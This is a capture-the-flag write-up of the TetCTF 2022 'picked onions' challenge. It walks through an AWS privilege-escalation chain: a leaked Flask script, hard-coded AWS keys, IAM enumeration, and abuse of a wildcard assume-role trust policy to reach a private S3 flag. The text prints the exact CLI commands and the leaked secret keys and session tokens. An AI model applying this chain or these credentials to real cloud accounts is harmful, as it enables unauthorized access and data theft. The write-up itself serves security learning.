# TetCTF 2022 picked onions writeup (856 point, 13 solves) (~~Web~~ Cloud✔️)


Although it is said that this challenge is about web, however most of part are about AWS cloud. I learned a lot about AWS after solving this challenge, as I know nothing about AWS at the beginning

### Description :
```
Description: Here in Vietnam we celebrate Tet with Banh Chung and "Picked Onions". You wanna try?
Service: http://139.162.21.219:1337
```
---
### Solution : 

On the website menu, there is a link to the secret page : 
http://139.162.21.219:1337/secret

![](https://i.imgur.com/Jbhe44J.png)

Checking the source of the image, we can find that it's from AWS S3 instead of the website itself :

https://secret-tetctf.s3.us-east-1.amazonaws.com/I%27ve_Got_a_Secret.jpg

Going to the S3 page, we can see a file called secret : 

https://secret-tetctf.s3.us-east-1.amazonaws.com/

![](https://i.imgur.com/l3ZkE9g.png)

Then we can download the file : 

https://secret-tetctf.s3.us-east-1.amazonaws.com/secret

It is the python script that runs the web server using flask : 

```python
#!/usr/bin/python3
import json
import boto3
import base64
import pickle
from flask import *

app = Flask(__name__)

@app.route('/')
def index():
        return render_template('index.html')

@app.route('/login',methods=["GET","POST"])
def login():
        if request.method=="POST":
                return render_template('login.html',msg='Invalid Credentials')
        else:
                return render_template('login.html',msg='')

@app.route('/secret')
def env():
    return render_template('secret.html')

@app.route('/services')
def services():
        return render_template('services.html')

@app.route('/customers')
def customers():
        dynamodb = boto3.resource('dynamodb', region_name='us-east-1',aws_access_key_id='AKIAXNIS54OCBQD5C4ME',aws_secret_access_key='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')
        table = dynamodb.Table('customers')
        response = table.scan()
        data=[]
        for i in response["Items"]:
                print (i)
                i=base64.b64decode(i["data"])
                i=pickle.loads(i)
                print (i)
                data.append(i)
        return render_template('customers.html',data=data)

app.run('0.0.0.0',9000)
```

Two things can be seen in the sourc code which look interesting

The access key and the secret key for AWS which is used for accessing the dynamodb

Also, it is using pickle to deserialize the data from the database, if we can control the data on the database, we might be able to exploit it.


Using the access key and the secret key, we can access AWS as that user.

However it turns out the pickle deserialization is just a rabbit hole, as we cannot change the data on the database.

We can create profile to use those keys :  
```
aws configure --profile <profile name>
```

Or we can just change the `~/.aws/credentials` file directly

We can access the data on the database using those keys : 
```json
aws --profile=tetctf dynamodb scan --table-name customers
{
    "Items": [
        {
            "Id": {
                "N": "3"
            },
            "data": {
                "S": "gASVKgAAAAAAAAB9lCiMBG5hbWWUjAtNeSBGcmllbmQgM5SMBGRlc2OUjAZNZW1iZXKUdS4="
            }
        },
        {
            "Id": {
                "N": "2"
            },
            "data": {
                "S": "gASVKgAAAAAAAAB9lCiMBG5hbWWUjAtNeSBGcmllbmQgMpSMBGRlc2OUjAZNZW1iZXKUdS4="
            }
        },
        {
            "Id": {
                "N": "4"
            },
            "data": {
                "S": "gASVKgAAAAAAAAB9lCiMBG5hbWWUjAtNeSBGcmllbmQgNJSMBGRlc2OUjAZNZW1iZXKUdS4="
            }
        },
        {
            "Id": {
                "N": "1"
            },
            "data": {
                "S": "gASVKwAAAAAAAAB9lCiMBG5hbWWUjAtNeSBGcmllbmQgMZSMBGRlc2OUjAdDYXB0YWlulHUu"
            }
        }
    ],
    "Count": 4,
    "ScannedCount": 4,
    "ConsumedCapacity": null
}
```

I tried to add/modify data, and found that the user don't have permission to do it, so we can't exploit that deserialization in the python script.

Then I used this tool to test for what that user is able to do : 

https://github.com/andresriancho/enumerate-iam

```
python3 enumerate-iam.py --access-key AKIAXNIS54OCBQD5C4ME --secret-key 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
2022-01-02 08:08:36,589 - 593499 - [INFO] Starting permission enumeration for access-key-id "AKIAXNIS54OCBQD5C4ME"
2022-01-02 08:08:38,060 - 593499 - [INFO] -- Account ARN : arn:aws:iam::509530203012:user/ddb_user
2022-01-02 08:08:38,060 - 593499 - [INFO] -- Account Id  : 509530203012
2022-01-02 08:08:38,061 - 593499 - [INFO] -- Account Path: user/ddb_user
2022-01-02 08:08:38,285 - 593499 - [INFO] Attempting common-service describe / list brute force.
2022-01-02 08:08:48,341 - 593499 - [INFO] -- dynamodb.list_backups() worked!
2022-01-02 08:08:48,579 - 593499 - [INFO] -- dynamodb.list_tables() worked!
2022-01-02 08:08:48,821 - 593499 - [INFO] -- dynamodb.list_tables() worked!
2022-01-02 08:08:49,055 - 593499 - [INFO] -- dynamodb.describe_limits() worked!
2022-01-02 08:08:49,283 - 593499 - [INFO] -- dynamodb.describe_endpoints() worked!
2022-01-02 08:08:49,533 - 593499 - [INFO] -- dynamodb.list_global_tables() worked!
2022-01-02 08:08:54,189 - 593499 - [INFO] -- iam.list_roles() worked!
2022-01-02 08:08:57,544 - 593499 - [INFO] -- sts.get_caller_identity() worked!
2022-01-02 08:08:57,775 - 593499 - [INFO] -- sts.get_session_token() worked!
```

I found that we can list out the roles : 

```json
aws iam list-roles --profile tetctf
{
    "Roles": [
        {
            "Path": "/aws-service-role/dynamodb.application-autoscaling.amazonaws.com/",
            "RoleName": "AWSServiceRoleForApplicationAutoScaling_DynamoDBTable",
            "RoleId": "AROAXNIS54OCPKGBTFMFC",
            "Arn": "arn:aws:iam::509530203012:role/aws-service-role/dynamodb.application-autoscaling.amazonaws.com/AWSServiceRoleForApplicationAutoScaling_DynamoDBTable",
            "CreateDate": "2021-12-29T15:04:01Z",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "dynamodb.application-autoscaling.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/organizations.amazonaws.com/",
            "RoleName": "AWSServiceRoleForOrganizations",
            "RoleId": "AROAXNIS54OCIRKGIPOQD",
            "Arn": "arn:aws:iam::509530203012:role/aws-service-role/organizations.amazonaws.com/AWSServiceRoleForOrganizations",
            "CreateDate": "2021-04-13T22:25:04Z",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "organizations.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Service-linked role used by AWS Organizations to enable integration of other AWS services with Organizations.",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/sso.amazonaws.com/",
            "RoleName": "AWSServiceRoleForSSO",
            "RoleId": "AROAXNIS54OCC5ALWKJR4",
            "Arn": "arn:aws:iam::509530203012:role/aws-service-role/sso.amazonaws.com/AWSServiceRoleForSSO",
            "CreateDate": "2021-04-13T22:25:09Z",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "sso.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Service-linked role used by AWS SSO to manage AWS resources, including IAM roles, policies and SAML IdP on your behalf.",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/support.amazonaws.com/",
            "RoleName": "AWSServiceRoleForSupport",
            "RoleId": "AROAXNIS54OCDJMOEFYMQ",
            "Arn": "arn:aws:iam::509530203012:role/aws-service-role/support.amazonaws.com/AWSServiceRoleForSupport",
            "CreateDate": "2020-12-10T21:59:31Z",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "support.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Enables resource access for AWS to provide billing, administrative and support services",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/trustedadvisor.amazonaws.com/",
            "RoleName": "AWSServiceRoleForTrustedAdvisor",
            "RoleId": "AROAXNIS54OCJF7JTFONU",
            "Arn": "arn:aws:iam::509530203012:role/aws-service-role/trustedadvisor.amazonaws.com/AWSServiceRoleForTrustedAdvisor",
            "CreateDate": "2020-12-10T21:59:31Z",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "trustedadvisor.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Access for the AWS Trusted Advisor Service to help reduce cost, increase performance, and improve security of your AWS environment.",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "CTF_ROLE",
            "RoleId": "AROAXNIS54OCL3NLUWKHX",
            "Arn": "arn:aws:iam::509530203012:role/CTF_ROLE",
            "CreateDate": "2021-12-29T15:30:56Z",
            "AssumeRolePolicyDocument": {
                "Version": "2008-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "*"
                        },
                        "Action": "sts:AssumeRole",
                        "Condition": {
                            "StringLike": {
                                "aws:PrincipalArn": "arn:aws:iam::*:role/*-Accessing_Tet_CTF_Flag*"
                            }
                        }
                    }
                ]
            },
            "Description": "CTF_ROLE",
            "MaxSessionDuration": 3600
        }
    ]
}
```

By googling about AWS misconfiguration, I found that we are able to assume the CTF_ROLE because of that principal field has wildcard.

However it has a condition, which the role to assume it need to be `arn:aws:iam::*:role/*-Accessing_Tet_CTF_Flag*`

That user don't have permission to create role, so I think I have to create my own AWS account and create my own role that match the condition.

As it used a wildcard on the account id field, so any valid AWS account can bypass that condition.

However creating an AWS account requires credit card, and I don't have any.

So I asked the admin if this challenge is able to be solved without an AWS account, and the admin replied : 
```Yeah. An account is needed to assume CTF_ROLE to go further.```

Luckily, the admin lend me the key of an AWS account, so I can continue this challenge.

Then I created a role on that account that match that condition : 

```json
aws iam create-role --role-name kaiziron-Accessing_Tet_CTF_Flag1 --assume-role-policy-document file://policy.json
{
    "Role": {
        "Path": "/",
        "RoleName": "kaiziron-Accessing_Tet_CTF_Flag1",
        "RoleId": "AROAXNIS54OCABZLMIZSM",
        "Arn": "arn:aws:iam::509530203012:role/kaiziron-Accessing_Tet_CTF_Flag1",
        "CreateDate": "2022-01-02T16:11:32Z",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "*"
                    },
                    "Action": "sts:AssumeRole"
                }
            ]
        }
    }
}
```

For the policy document, I just googled for some example and modified a bit so that I can assume it : 
```json
{
  "Version": "2012-10-17",
  "Statement": [
      {
          "Effect": "Allow",
          "Principal": { "AWS": "*" },
          "Action": "sts:AssumeRole"
      }
  ]
}
```

Then I just assume that role I just created : 
```json
aws sts assume-role --role-arn 'arn:aws:iam::509530203012:role/kaiziron-Accessing_Tet_CTF_Flag1' --role-session-name kaiziron-Accessing_Tet_CTF_Flag1
{
    "Credentials": {
        "AccessKeyId": "ASIAXNIS54OCATXMILEM",
        "SecretAccessKey": "iC/IdpU8nLrVKSQy0ZWECWK0jLEhN8S7ORoy2shH",
        "SessionToken": "FwoGZXIvYXdzEFIaDK+/5Ep+5h3rYloZmSLEASg0RyPdc6vE8o6HbfOY9rTngXbXFusRrWBI957bsupUWJR4EWF18X1eGWp0zTB6NPw8QvV+8dwrdDJTnN3p5M5lIS5JhIGlJy6k2bWIOFg+jbjLNWeN7J2H/fw5xqSYq7ouWO6uqWW816zOYvkQzaL7rC4xOwabm7PY/BZeKJ/ufrhh943i5hAQp7LsXIeI3L51X18voDFNxHyXXdF5llUUt6NtsxNL4FqSe9qjJNAhNtJD8puRK0VFNtXeunqdjzzHS74oxp/HjgYyLc3jL7NMMctPZLUwhyJfGyvpN2yckB98xsXIB8wj5XZAob8d7X/zO63VNSaOrQ==",
        "Expiration": "2022-01-02T17:16:06Z"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAXNIS54OCABZLMIZSM:kaiziron-Accessing_Tet_CTF_Flag1",
        "Arn": "arn:aws:sts::509530203012:assumed-role/kaiziron-Accessing_Tet_CTF_Flag1/kaiziron-Accessing_Tet_CTF_Flag1"
    }
}
```

Then I just create another profile using the access key, secret key and the session token above

Using that role which match the condition, we can assume the CTF_ROLE because of its misconfiguration : 

```json
aws sts assume-role --role-arn 'arn:aws:iam::509530203012:role/CTF_ROLE' --role-session-name kaiziron-Accessing_Tet_CTF_Flag1 --profile tetctf2
{
    "Credentials": {
        "AccessKeyId": "ASIAXNIS54OCJUV3JOH4",
        "SecretAccessKey": "8uFq78MyTml9Uze8AzMuw94LQo29wmzgspSDC3wX",
        "SessionToken": "FwoGZXIvYXdzEFIaDOfZXuz+NaSmJcoz0SLEAYxKhJuhMQpuunIbEmp6M1ObHpgYbihCOM/JGod/iOBCGTuhV40kSAGfb3lNQITH9HKMBH5cAqRzFlDm8tXDNdH5r7QfiItf/AM4QThYGHVyXkTJYGSfeqY1epfM++j4yCiiCZfsVldIdnZDu2HSa0c66bckSOXanI37hp9RVmsXrvJbzX2ovsohLUy74dXmTXufa+Rcj3BrKXnI1/hwTycmwM+UX4ITStvh4EFiIBbxSGf9SDOklu2bF+D3uv3TIS9OsWUosKDHjgYyLe1gnguZD6/zLC8sgPxM+fiVmVK6qe4ZsUEtYlHftp9LhgCHTvPBvi5WZUS++Q==",
        "Expiration": "2022-01-02T17:17:52Z"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAXNIS54OCL3NLUWKHX:kaiziron-Accessing_Tet_CTF_Flag1",
        "Arn": "arn:aws:sts::509530203012:assumed-role/CTF_ROLE/kaiziron-Accessing_Tet_CTF_Flag1"
    }
}
```

Then I just use these new keys and token to continue.

I used that tool again to see if we have other permission over that AWS account using this CTF_ROLE :
```
python3 enumerate-iam.py --access-key ASIAXNIS54OCJUV3JOH4 --secret-key 8uFq78MyTml9Uze8AzMuw94LQo29wmzgspSDC3wX --session-token FwoGZXIvYXdzEFIaDOfZXuz+NaSmJcoz0SLEAYxKhJuhMQpuunIbEmp6M1ObHpgYbihCOM/JGod/iOBCGTuhV40kSAGfb3lNQITH9HKMBH5cAqRzFlDm8tXDNdH5r7QfiItf/AM4QThYGHVyXkTJYGSfeqY1epfM++j4yCiiCZfsVldIdnZDu2HSa0c66bckSOXanI37hp9RVmsXrvJbzX2ovsohLUy74dXmTXufa+Rcj3BrKXnI1/hwTycmwM+UX4ITStvh4EFiIBbxSGf9SDOklu2bF+D3uv3TIS9OsWUosKDHjgYyLe1gnguZD6/zLC8sgPxM+fiVmVK6qe4ZsUEtYlHftp9LhgCHTvPBvi5WZUS++Q==
2022-01-03 00:21:08,540 - 78019 - [INFO] Starting permission enumeration for access-key-id "ASIAXNIS54OCJUV3JOH4"
2022-01-03 00:21:10,032 - 78019 - [INFO] -- Account ARN : arn:aws:sts::509530203012:assumed-role/CTF_ROLE/kaiziron-Accessing_Tet_CTF_Flag1
2022-01-03 00:21:10,032 - 78019 - [INFO] -- Account Id  : 509530203012
2022-01-03 00:21:10,032 - 78019 - [INFO] -- Account Path: assumed-role/CTF_ROLE/kaiziron-Accessing_Tet_CTF_Flag1
2022-01-03 00:21:12,166 - 78019 - [INFO] Attempting common-service describe / list brute force.
2022-01-03 00:21:15,718 - 78019 - [INFO] -- dynamodb.describe_endpoints() worked!
2022-01-03 00:21:16,378 - 78019 - [INFO] -- s3.list_buckets() worked!
2022-01-03 00:21:16,388 - 78019 - [ERROR] Remove globalaccelerator.describe_accelerator_attributes action
2022-01-03 00:21:33,573 - 78019 - [INFO] -- sts.get_caller_identity() worked!
```

I found that we can list out the S3 bucket : 

```
aws --profile ctf_role s3 ls
2021-12-31 15:11:47 secret-tetctf
2021-12-29 22:48:31 tet-ctf-secret
```

`secret-tetctf` is the bucket that contains the python script and the image, and `tet-ctf-secret` is a newly discover bucket.

I tried to use this URL to access it, however access denied : 

https://tet-ctf-secret.s3.us-east-1.amazonaws.com/

![](https://i.imgur.com/bTXYs9b.png)


So I just access it using the AWS CLI with those keys for the CTF_ROLE : 
```
aws --profile ctf_role s3 ls s3://tet-ctf-secret
2021-12-29 23:18:42         29 flag
```

The flag is finally found, so I just copy it to my machine and read it : 

```
aws --profile ctf_role s3 cp s3://tet-ctf-secret/flag .
download: s3://tet-ctf-secret/flag to ./flag     

cat flag
TetCTF{AssumE_R0le-iS-A-MuSt}
```
